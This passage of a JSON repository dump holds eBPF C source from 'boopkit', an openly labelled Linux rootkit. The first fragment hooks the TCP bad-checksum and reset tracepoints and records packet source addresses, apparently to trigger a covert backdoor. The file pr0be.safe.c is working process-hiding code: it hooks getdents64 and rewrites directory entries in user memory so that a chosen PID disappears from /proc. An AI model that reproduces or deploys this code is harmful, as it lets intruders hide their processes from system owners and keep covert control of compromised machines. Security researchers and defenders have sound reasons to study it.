\"vmlinux.h\"\n// clang-format on\n#include <bpf/bpf_endian.h>\n#include <bpf/bpf_helpers.h>\n#include <string.h>\n\n#include \"boopkit.h\"\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 8192);\n  __type(key, int);\n  __type(value, struct event_boop_t);\n} event SEC(\".maps\");\n\n// tcp_bad_csum_args_t\n//\n//  [Here be dragons!]\n//\nstruct tcp_bad_csum_args_t {\n  // ------------------ // Note: We are pretty confident that the struct\n  __u8 padding[16];     // provided by vmlinux.h (trace_event_raw_tcp_event_skb)\n  __u8 skbaddr_pad[4];  // is the wrong size. The trace_entry struct is 8 bytes\n  // ------------------ // and the 16 byte \"padding\" seems to be the offset!\n  __u8 saddr[28];\n  __u8 daddr[28];\n  char __data[0];\n};\n\n// name: tcp_bad_csum\n// ID: 1363\n// format:\n// field:unsigned short common_type;       offset:0;       size:2; signed:0;\n// field:unsigned char common_flags;       offset:2;       size:1; signed:0;\n// field:unsigned char common_preempt_count;       offset:3;       size:1;\n// signed:0; field:int common_pid;   offset:4;       size:4; signed:1;\n//\n// field:const void * skbaddr;     offset:8;       size:8; signed:0;\n// field:__u8 saddr[sizeof(struct sockaddr_in6)];  offset:16; size:28; signed:0;\n// field:__u8 daddr[sizeof(struct sockaddr_in6)];  offset:44;\n// size:28;   signed:0;\n//\n// print fmt: \"src=%pISpc dest=%pISpc\", REC->saddr, REC->daddr\nSEC(\"tp/tcp/tcp_bad_csum\")\nint tcp_bad_csum(struct tcp_bad_csum_args_t *args) {\n  struct event_boop_t ret;\n  int saddrkey = 1;\n  ret.event_src_code = EVENT_SRC_BAD_CSUM;\n  memcpy(ret.saddr, args->saddr, sizeof ret.saddr);\n  // bpf_probe_read_kernel(ret.saddr, sizeof ret.saddr, args->saddr);\n  bpf_map_update_elem(&event, &saddrkey, &ret, 1);\n  return 0;\n}\n\nstruct tcp_receive_reset_args_t {\n  unsigned long long pad;\n\n  const void *skaddr;\n  __u16 sport;\n  __u16 dport;\n  __u16 family;\n  __u8 saddr[4];\n  __u8 daddr[4];\n  __u8 saddr_v6[16];\n  __u8 daddr_v6[16];\n  __u64 sock_cookie;\n};\n\n// name: tcp_receive_reset\n// ID: 1368\n// format:\n//        field:unsigned short common_type;       offset:0;       size:2;\n//        signed:0; field:unsigned char common_flags;       offset:2; size:1;\n//        signed:0; field:unsigned char common_preempt_count;       offset:3;\n//        size:1; signed:0; field:int common_pid;   offset:4;       size:4;\n//        signed:1;\n//\n//        field:const void * skaddr;      offset:8;       size:8; signed:0;\n//        field:__u16 sport;      offset:16;      size:2; signed:0;\n//        field:__u16 dport;      offset:18;      size:2; signed:0;\n//        field:__u16 family;     offset:20;      size:2; signed:0;\n//        field:__u8 saddr[4];    offset:22;      size:4; signed:0;\n//        field:__u8 daddr[4];    offset:26;      size:4; signed:0;\n//        field:__u8 saddr_v6[16];        offset:30;      size:16; signed:0;\n//        field:__u8 daddr_v6[16];        offset:46;      size:16; signed:0;\n//        field:__u64 sock_cookie;        offset:64;      size:8; signed:0;\n//\n// print fmt: \"family=%s sport=%hu dport=%hu saddr=%pI4 daddr=%pI4\n// saddrv6=%pI6c daddrv6=%pI6c sock_cookie=%llx\", __print_symbolic(REC->family,\n// { 2, \"AF_INET\" }, { 10, \"AF_INET6\" }), REC->sport, REC->dport, REC->saddr,\n// REC->daddr, REC->saddr_v6, REC->daddr_v6, REC->sock_cookie\nSEC(\"tp/tcp/tcp_receive_reset\")\nint tcp_receive_reset(struct tcp_receive_reset_args_t *args) {\n  int saddrkey = 1;\n  struct event_boop_t ret;\n  ret.event_src_code = EVENT_SRC_RECEIVE_RESET;\n  memcpy(ret.saddr, args->saddr, sizeof ret.saddr);\n  // bpf_probe_read_kernel(ret.saddr,sizeof ret.saddr, args->saddr);\n  bpf_map_update_elem(&event, &saddrkey, &ret, 1);\n  return 0;\n}\n\n// SPDX-License-Identifier: GPL-2.0\n// The eBPF probe is dual-licensed with GPL because Linux is a fucking shit\n// show.\nchar LICENSE[] SEC(\"license\") = \"GPL\";"
        },
        {
          "name": "pr0be.safe.c",
          "type": "blob",
          "size": 7.7021484375,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n//\n// Dual licensed with BSD-3\n//\n// Forked from: https://github.com/pathtofile/bad-bpf\n//\n// SPDX-License-Identifier: BSD-3-Clause\n// clang-format off\n#include \"vmlinux.h\"\n// clang-format on\n#include <bpf/bpf_core_read.h>\n#include <bpf/bpf_helpers.h>\n#include <bpf/bpf_tracing.h>\n\n#include \"boopkit.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\n// SPDX-License-Identifier: BSD-3-Clause\n#define TASK_COMM_LEN 16\nstruct event {\n  int pid;\n  char comm[TASK_COMM_LEN];\n  int success;\n};\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_RINGBUF);\n  __uint(max_entries, 8192);\n} rb SEC(\".maps\");\n\nstruct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 8192);\n  __type(key, size_t);\n  __type(value, long unsigned int);\n} map_buffs SEC(\".maps\");\n\n// Map used to enable searching through the\n// data in a loop\nstruct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 8192);\n  __type(key, size_t);\n  __type(value, int);\n} map_bytes_read SEC(\".maps\");\n\n// Map with address of actual\nstruct {\n  __uint(type, BPF_MAP_TYPE_HASH);\n  __uint(max_entries, 8192);\n  __type(key, size_t);\n  __type(value, long unsigned int);\n} map_to_patch SEC(\".maps\");\n\n// Map to hold program tail calls\nstruct {\n  __uint(type, BPF_MAP_TYPE_PROG_ARRAY);\n  __uint(max_entries, 5);\n  __type(key, __u32);\n  __type(value, __u32);\n} map_prog_array SEC(\".maps\");\n\n// Optional Target Parent PID\nconst volatile int target_ppid = 0;\n\n// These store the string representation\n// of the PID to hide. This becomes the name\n// of the folder in /proc/\nconst volatile int pid_to_hide_len = 0;\nconst volatile char pid_to_hide[16];\n\n// struct linux_dirent64 {\n//     u64        d_ino;    /* 64-bit inode number */\n//     u64        d_off;    /* 64-bit offset to next structure */\n//     unsigned short d_reclen; /* Size of this dirent */\n//     unsigned char  d_type;   /* File type */\n//     char           d_name[]; /* Filename (null-terminated) */ };\n// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int\n// count);\nSEC(\"tp/syscalls/sys_enter_getdents64\")\nint handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {\n  size_t pid_tgid = bpf_get_current_pid_tgid();\n  // Check if we're a process thread of interest\n  // if target_ppid is 0 then we target all pids\n  if (target_ppid != 0) {\n    struct task_struct *task = (struct task_struct *)bpf_get_current_task();\n    int ppid = BPF_CORE_READ(task, real_parent, tgid);\n    if (ppid != target_ppid) {\n      return 0;\n    }\n  }\n  // int pid = pid_tgid >> 32;\n  // unsigned int fd = ctx->args[0];\n  // unsigned int buff_count = ctx->args[2];\n\n  // Store params in map for exit function\n  struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];\n  bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);\n\n  return 0;\n}\n\nSEC(\"tp/syscalls/sys_exit_getdents64\")\nint handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {\n  size_t pid_tgid = bpf_get_current_pid_tgid();\n  int total_bytes_read = ctx->ret;\n  // if bytes_read is 0, everything's been read\n  if (total_bytes_read <= 0) {\n    return 0;\n  }\n\n  // Check we stored the address of the buffer from the syscall entry\n  long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);\n  if (pbuff_addr == 0) {\n    return 0;\n  }\n\n  // All of this is quite complex, but basically boils down to\n  // Calling 'handle_getdents_exit' in a loop to iterate over the file listing\n  // in chunks of 200, and seeing if a folder with the name of our pid is in\n  // there. If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch\n  // to do the actual patching\n  long unsigned int buff_addr = *pbuff_addr;\n  struct linux_dirent64 *dirp = 0;\n  // int pid = pid_tgid >> 32;\n  short unsigned int d_reclen = 0;\n  char filename[16];\n\n  unsigned int bpos = 0;\n  unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);\n  if (pBPOS != 0) {\n    bpos = *pBPOS;\n  }\n\n  for (int i = 0; i < 200; i++) {\n    if (bpos >= total_bytes_read) {\n      break;\n    }\n    dirp = (struct linux_dirent64 *)(buff_addr + bpos);\n    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);\n    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);\n\n    int j = 0;\n    for (j = 0; j < pid_to_hide_len; j++) {\n      if (filename[j] != pid_to_hide[j]) {\n        break;\n      }\n    }\n    if (j == pid_to_hide_len) {\n      // ***********\n      // We've found the folder!!!\n      // Jump to handle_getdents_patch so we can remove it!\n      // ***********\n      bpf_map_delete_elem(&map_bytes_read, &pid_tgid);\n      bpf_map_delete_elem(&map_buffs, &pid_tgid);\n      bpf_tail_call(ctx, &map_prog_array, 2);\n    }\n    bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);\n    bpos += d_reclen;\n  }\n\n  // If we didn't find it, but there's still more to read,\n  // jump back the start of this function and keep looking\n  if (bpos < total_bytes_read) {\n    bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);\n    bpf_tail_call(ctx, &map_prog_array, 1);\n  }\n  bpf_map_delete_elem(&map_bytes_read, &pid_tgid);\n  bpf_map_delete_elem(&map_buffs, &pid_tgid);\n\n  return 0;\n}\n\nSEC(\"tp/syscalls/sys_exit_getdents64\")\nint handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {\n  // Only patch if we've already checked and found our pid's folder to hide\n  size_t pid_tgid = bpf_get_current_pid_tgid();\n  long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);\n  if (pbuff_addr == 0) {\n    return 0;\n  }\n\n  // Unlink target, by reading in previous linux_dirent64 struct,\n  // and setting it's d_reclen to cover itself and our target.\n  // This will make the program skip over our folder.\n  long unsigned int buff_addr = *pbuff_addr;\n  struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;\n  short unsigned int d_reclen_previous = 0;\n  bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous),\n                      &dirp_previous->d_reclen);\n\n  struct linux_dirent64 *dirp =\n      (struct linux_dirent64 *)(buff_addr + d_reclen_previous);\n  short unsigned int d_reclen = 0;\n  bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);\n\n  // Attempt to overwrite\n  short unsigned int d_reclen_new = d_reclen_previous + d_reclen;\n  long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new,\n                                  sizeof(d_reclen_new));\n\n  // Send an event\n  struct event *e;\n  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);\n  if (e) {\n    e->success = (ret == 0);\n    e->pid = (pid_tgid >> 32);\n    bpf_get_current_comm(&e->comm, sizeof(e->comm));\n    bpf_ringbuf_submit(e, 0);\n  }\n\n  bpf_map_delete_elem(&map_to_patch, &pid_tgid);\n  return 0;\n}"
        },
        {
          "name": "pr0be.xdp.c",
          "type": "blob",
          "size": 1.4052734375,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// clang-format off\n#include \"vmlinux.h\"\n// clang-format on\n\n// SPDX-License-Identifier: GPL-2.0\n// The eBPF probe is dual-licensed with GPL because Linux is a fucking shit\n// show.\n// char LICENSE[] SEC(\"license\") = \"GPL\";"
        },
        {
          "name": "slides",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}